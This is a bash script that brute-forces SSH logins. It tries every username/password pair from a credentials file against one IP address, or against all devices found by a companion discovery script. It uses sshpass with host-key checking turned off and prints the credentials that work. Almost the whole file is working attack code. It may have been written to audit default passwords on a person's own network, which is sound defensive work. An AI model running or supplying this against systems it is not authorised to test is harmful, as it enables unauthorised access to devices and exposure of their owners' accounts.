# Brute force SSH to specified IP with all the credential in credentials.txt
function connect
{
    ip=$1;
    while read creds
    do
        username=$(echo "$creds" | awk '{print $1}')
        password=$(echo "$creds" | awk '{print $2}')
        connecetion="$username@$ip"
        sshpass -p "$password" ssh "$connecetion" -o ConnectTimeout=2 StrictHostKeyChecking=no "ls" 2>/dev/null
        if [ $? -eq 0 ];then
            echo "IP : $ip is Vulnerable to username:$username and password:$password"
			return 0
        fi
    done  < $CREDENTIALS_LIST_FILE
	return 1
}
# Checks vulnerability of all devices found by discoverDevices.sh
function pingAll
{
	bash ./discoverDevices.sh
	while read line
	do 
		ip=$(echo "$line" | awk '{print $1}')
		connect "$ip"
	done   < $IP_LIST_FILE
}

CREDENTIALS_LIST_FILE="../etc/credentials.txt"
IP_LIST_FILE="../build/connectedDevices.txt"
if [ $# -lt 1 ];then
	echo "Usage $0 [<ip address>|all]"
	exit 1
fi


if [ "$1" == "all" ];then
	pingAll
else
	connect "$1"
	#if [ $? -eq 0 ]
	#then
	#	return 0
	#fi
	#return 1
fi
